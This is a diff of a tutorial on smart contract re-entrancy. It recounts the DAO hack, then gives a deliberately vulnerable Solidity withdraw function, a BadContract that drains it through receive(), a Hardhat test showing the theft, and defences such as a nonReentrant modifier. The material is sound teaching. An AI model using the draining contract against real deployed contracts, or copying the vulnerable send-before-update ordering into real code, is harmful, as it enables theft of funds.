@@ -1,26 +1,36 @@
 # Re-Entrancy
 
-Who wants to do some hacking!!!
+Re-Entrancy is one of the oldest security vulnerabilities that was discovered in smart contracts. It is the exact vulnerability that caused the infamous 'DAO Hack' of 2016. Over 3.6 million ETH was stolen in the hack, which today is worth billions of dollars.
+
+At the time, the DAO contained 15% of all Ethereum on the network as Ethereum was relatively new. The failure was having a negative impact on the Ethereum network, and Vitalik Buterin proposed a software fork where the attacker would never be able to transfer out his ETH. Some people agreed, some did not. This was a highly controversial event, and one which still is full of controversy.
+
+At the end, it led to Ethereum being forked into two - Ethereum Classic, and the Ethereum we know today. Ethereum Classic's blockchain is the exact same as Ethereum up until the fork, but then proceeded as if the hack did happen and the attacker still controls the stolen funds. Today's Ethereum implemented the blacklist and it's as if that attack never happened.
+
+This is a simplified version of that story, and the entire dynamic was quite complex. Everyone was stuck between a rock and a hard place. [You can read more about this story here to know what happened in more detail](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/)
 
 ---
 
 ## What is Re-Entrancy?
 
-- Contract A calls a function in contract B
-- Then contract B callsback contract A while contract A is still processing
+![](https://i.imgur.com/Zl9kRLD.png)
 
-This can lead to some serious vulnerabilities in Smart contracts.
+Re-Entrancy is the vulnerability in which if `Contract A` calls a function in `Contract B`, `Contract B` can then call back into `Contract A` while `Contract A` is still processing.
 
-## Real World Examples?
+This can lead to some serious vulnerabilities in Smart contracts, often creating the possibility of draining funds from a contract.
 
-[The DAO Attack](https://coinmarketcap.com/alexandria/article/a-history-of-the-dao-hack)
+Let's understand how this works with the example shown in the above diagram. Let's say `Contract A` has some function - call it `f()` that does 3 things:
 
-## Requirements
+- Checks the balance of ETH deposited into `Contract A` by `Contract B`
+- Sends the ETH back to `Contract B`
+- Updates the balance of `Contract B` to 0
 
-- There will be two contracts: GoodContract and BadContract
-- BadContract should be able drain all the Eth out of the GoodContract
+Since the balance gets updated after the ETH has been sent, `Contract B` can do some tricky stuff here. If `Contract B` was to create a `fallback()` or `receive()` function in it's contract, which would execute when it received ETH, it could call `f()` in `Contract A` again.
 
-## Build
+Since `Contract A` hasn't yet updated the balance of `Contract B` to be 0 at that point, it would send ETH to `Contract B` again - and herein lies the exploit, and `Contract B` could keep doing this until `Contract A` was completely out of ETH.
+
+## BUIDL
+
+We will create a couple of smart contracts, `GoodContract` and `BadContract` to demonstrate this behaviour. `BadContract` will be able to drain all the ETH out from `GoodContract`.
 
 Lets build an example where you can experience how the Re-Entrancy attack happens.
 
@@ -29,6 +39,12 @@ Lets build an example where you can experience how the Re-Entrancy attack happen
   ```bash
   npm init --yes
   npm install --save-dev hardhat
+  ```
+
+- If you are on Windows, please do this extra step and install these libraries as well :)
+
+  ```bash
+  npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
   ```
 
 - In the same directory where you installed Hardhat run:
@@ -44,34 +60,22 @@ Lets build an example where you can experience how the Re-Entrancy attack happen
 
 Now you have a hardhat project ready to go!
 
-If you are not on mac, please do this extra step and install these libraries as well :)
+Let's start by creating a new file inside the `contracts` directory called `GoodContract.sol`
 
-```bash
-npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
-```
-
-and press `enter` for all the questions.
-
-- Start by creating a new file inside the contracts directory called GoodContract.sol
-
-```go
+```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.10;
+pragma solidity ^0.8.4;
 
 contract GoodContract {
 
     mapping(address => uint) public balances;
 
-    /**
-        addBalance is used to add ether to the user's balance
-     */
+    // Update the `balances` mapping to include the new ETH deposited by msg.sender
     function addBalance() public payable {
         balances[msg.sender] += msg.value;
     }
 
-    /**
-        withdraw is used to remove the user's balance of ether
-     */
+    // Send ETH worth `balances[msg.sender]` back to msg.sender
     function withdraw() public {
         require(balances[msg.sender] > 0);
         (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
@@ -83,151 +87,143 @@ contract GoodContract {
 }
 ```
 
-- GoodContract has two functions
+The contract is quite simple. The first function, `addBalance` updates a mapping to reflect how much ETH has been deposited into this contract by another address. The second function, `withdraw`, allows users to withdraw their ETH back - but the ETH is sent _before_ the balance is updated.
 
-  - addBalance() which adds ether balance for an address
-  - withdraw() where users can withdraw all of their balance at once
+Now lets create another file inside the contracts directory known as `BadContract.sol`
 
-- Now lets create another file inside the contracts directory known as `BadContract.sol`
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
 
-```go
-    // SPDX-License-Identifier: MIT
-    pragma solidity ^0.8.10;
+import "./GoodContract.sol";
 
-    import "./GoodContract.sol";
+contract BadContract {
+    GoodContract public goodContract;
+    constructor(address _goodContractAddress) {
+        goodContract = GoodContract(_goodContractAddress);
+    }
 
-    contract BadContract {
-        GoodContract public goodContract;
-        constructor(address _goodContractAddress) {
-            goodContract = GoodContract(_goodContractAddress);
-        }
-        // Function to receive Ether. msg.data must be empty
-        receive() external payable {
-            if(address(goodContract).balance > 0) {
-                goodContract.withdraw();
-            }
-        }
-        /**
-            attack would start an attack to withdraw all the funds from the
-            goodContract
-        */
-        function attack() public payable {
-            goodContract.addBalance{value: msg.value}();
+    // Function to receive Ether
+    receive() external payable {
+        if(address(goodContract).balance > 0) {
             goodContract.withdraw();
         }
     }
+
+    // Starts the attack
+    function attack() public payable {
+        goodContract.addBalance{value: msg.value}();
+        goodContract.withdraw();
+    }
+}
 ```
 
-- BadContract has two functions
+This contract is much more interesting, let's understand what is going on.
 
-  - contructor which takes in the GoodContract's address and intilializes its own instance of GoodContract
-  - recieve() which gets called when contract recieves ethers and msg.data is empty
-  - attack() is the function which the user will use to drain all the Eth out of the GoodContract, how it will do so is as follows:
-    - Attack will call addBalance, making sure that BadContract's address has some balance in the GoodContract
-    - Now it will try calling the `GoodContract` withdraw function which will first check that the BadContract has some balance and then it will send `Eth` equal to BadContract's address balance to the BadContract.
-    - This will trigger the recieve function in the BadContract which will again call the withdraw function.
-    - Now in the withdraw function because `balances[msg.sender] = 0;` has not been executed yet, the contract still believes that the BadContract's address has balance.
-    - So it again sends the Eth equal to the amount of BadContract's balance to BadContract
-    - This keeps happening till all the Eth in GoodContract is drained
+Within the constructor, this contract sets the address of `GoodContract` and initializes an instance of it.
 
-- Replace all the code in your `hardhat.config.js` with the following code:
+The `attack` function is a `payable` function that takes some ETH from the attacker, deposits it into `GoodContract`, and then calls the `withdraw` function in `GoodContract`.
 
-  ```javascript
-  require("@nomiclabs/hardhat-waffle");
+At this point, `GoodContract` will see that `BadContract` has a balance greater than 0, so it will send some ETH back to `BadContract`. However, doing this will trigger the `receive()` function in `BadContract`.
 
-  // This is a sample Hardhat task. To learn how to create your own go to
-  // https://hardhat.org/guides/create-task.html
-  task("accounts", "Prints the list of accounts", async (taskArgs, hre) => {
-    const accounts = await hre.ethers.getSigners();
+The `receive()` function will check if `GoodContract` still has a balance greater than 0 ETH, and call the `withdraw` function in `GoodContract` again.
 
-    for (const account of accounts) {
-      console.log(account.address);
-    }
-  });
+This will create a loop where `GoodContract` will keep sending money to `BadContract` until it completely runs out of funds, and then finally reach a point where it updates `BadContract`'s balance to 0 and completes the transaction execution. At this point, the attacker has successfully stolen all the ETH from `GoodContract` due to re-entrancy.
 
-  // You need to export an object to set up your config
-  // Go to https://hardhat.org/config/ to learn more
+---
 
-  /**
-   * @type import('hardhat/config').HardhatUserConfig
-   */
-  module.exports = {
-    solidity: "0.8.10",
-  };
-  ```
+We will utilize Hardhat Tests to demonstrate that this attack actually works, to ensure that `BadContract` is actually draining all the funds from `GoodContract`. You can read the [Hardhat Docs for Testing](https://hardhat.org/tutorial/testing-contracts.html) to get familiar with the testing environment.
 
-- Now we would write a test to make sure that our BadContract is actually draining all the funds from the GoodContract
+Let's start off by creating a file named `attack.js` under the `test` folder, and add the following code there:
 
-- Read [Hardhat Docs for testing](https://hardhat.org/tutorial/testing-contracts.html) before procedding
+```js
+const { expect } = require("chai");
+const { BigNumber } = require("ethers");
+const { parseEther } = require("ethers/lib/utils");
+const { ethers } = require("hardhat");
 
-- Now create a file under the `test` folder named `attack.js`
+describe("Attack", function () {
+  it("Should empty the balance of the good contract", async function () {
+    // Deploy the good contract
+    const goodContractFactory = await ethers.getContractFactory("GoodContract");
+    const goodContract = await goodContractFactory.deploy();
+    await goodContract.deployed();
 
-- Add the following content to `attack.js`
+    //Deploy the bad contract
+    const badContractFactory = await ethers.getContractFactory("BadContract");
+    const badContract = await badContractFactory.deploy(goodContract.address);
+    await badContract.deployed();
 
-  ```js
-  const { expect } = require("chai");
-  const { BigNumber } = require("ethers");
-  const { ethers, waffle } = require("hardhat");
+    // Get two addresses, treat one as innocent user and one as attacker
+    const [_, innocentAddress, attackerAddress] = await ethers.getSigners();
 
-  describe("Attack", function () {
-    it("Should empty the balance of the good contract", async function () {
-      // Deploy the good contract
-      const goodContract = await ethers.getContractFactory("GoodContract");
-      const _goodContract = await goodContract.deploy();
-      await _goodContract.deployed();
-      console.log("Good Contract's Address", _goodContract.address);
-      //Deploy the bad contract
-      const badContract = await ethers.getContractFactory("BadContract");
-      const _badContract = await badContract.deploy(_goodContract.address);
-      await _badContract.deployed();
-      console.log("Bad Contract's Address", _badContract.address);
-      // Get two addresses
-      const [_, addr1, addr2] = await ethers.getSigners();
-
-      // User1 deposits 10 ether into the contract
-      let tx = await _goodContract.connect(addr1).addBalance({
-        value: ethers.utils.parseEther("10.0"),
-      });
-
-      await tx.wait();
-
-      const provider = waffle.provider;
-
-      // Check that at this point the GoodContract's balance is not zero
-      let balanceETH = await provider.getBalance(_goodContract.address);
-      expect(balanceETH).to.not.equal(BigNumber.from("0"));
-
-      // User calls attack function
-      tx = await _badContract.connect(addr2).attack({
-        value: ethers.utils.parseEther("1.0"),
-      });
-      await tx.wait();
-
-      balanceETH = await provider.getBalance(_goodContract.address);
-      // Balance of the GoodContract's address is zero now
-      expect(balanceETH).to.equal(BigNumber.from("0"));
+    // Innocent User deposits 10 ETH into GoodContract
+    let tx = await goodContract.connect(innocentAddress).addBalance({
+      value: parseEther("10"),
     });
+    await tx.wait();
+
+    // Check that at this point the GoodContract's balance is 10 ETH
+    let balanceETH = await ethers.provider.getBalance(goodContract.address);
+    expect(balanceETH).to.equal(parseEther("10"));
+
+    // Attacker calls the `attack` function on BadContract
+    // and sends 1 ETH
+    tx = await badContract.connect(attackerAddress).attack({
+      value: parseEther("1"),
+    });
+    await tx.wait();
+
+    // Balance of the GoodContract's address is now zero
+    balanceETH = await ethers.provider.getBalance(goodContract.address);
+    expect(balanceETH).to.equal(BigNumber.from("0"));
+
+    // Balance of BadContract is now 11 ETH (10 ETH stolen + 1 ETH from attacker)
+    balanceETH = await ethers.provider.getBalance(badContract.address);
+    expect(balanceETH).to.equal(parseEther("11"));
   });
-  ```
+});
+```
 
-- Now to finally execute the test, on your terminal type:
+In this test, we first deploy both `GoodContract` and `BadContract`.
 
-  ```
-  npx hardhat test
-  ```
+We then get two signers from Hardhat - the testing account gives us access to 10 accounts which are pre-funded with ETH. We treat one as an innocent user, and the other as the attacker.
 
-- If all your tests are passing you have completed the module. Use the GoodContract's Address that was printed on your terminal to verify this level on the website
+We have the innocent user send 10 ETH to `GoodContract`. Then, the attacker starts the attack by calling `attack()` on `BadContract` and sending 1 ETH to it.
+
+After the `attack()` transaction is finished, we check to see that `GoodContract` now has 0 ETH left, whereas `BadContract` now has 11 ETH (10 ETH that was stolen, and 1 ETH the attacker deposited).
+
+To finally execute the test, on your terminal type:
+
+```
+npx hardhat test
+```
+
+If all your tests are passing, then the attack succeeded!
 
 ## Prevention
 
-- Ensure all state changes happen before calling external contracts
-- Use function modifiers that prevent re-entrancy
+There are two things you can do.
 
-```go
-    modifier noReentrant() {
-        require(!locked, "No re-entrancy");
-        locked = true;
-        _;
-        locked = false;
-    }
+Either, you could recognize that this function was vulnerable to re-entrancy, and make sure you update the user's balance in the `withdraw` function _before_ you actually send them the ETH, so if they try to callback into `withdraw` it will fail.
+
+Alternatively, `OpenZeppelin` has a `ReentrancyGuard` library that provides a modifier named `nonReentrant` which blocks re-entrancy in functions you apply it to. It basically works like the following:
+
+```solidity
+modifier nonReentrant() {
+    require(!locked, "No re-entrancy");
+    locked = true;
+    _;
+    locked = false;
+}
 ```
+
+If you were to apply this on the `withdraw` function, the callbacks into `withdraw` would fail because `locked` will be equal to `true` until the first `withdraw` function finishes executing, thereby also preventing re-entrancy.
+
+## Readings
+
+These are optional, but recommended, readings
+
+- [DAO Hack](<(https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/)>)
+- [Reentrancy Guard Library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)
+- [Hardhat Testing](https://hardhat.org/tutorial/testing-contracts.html)
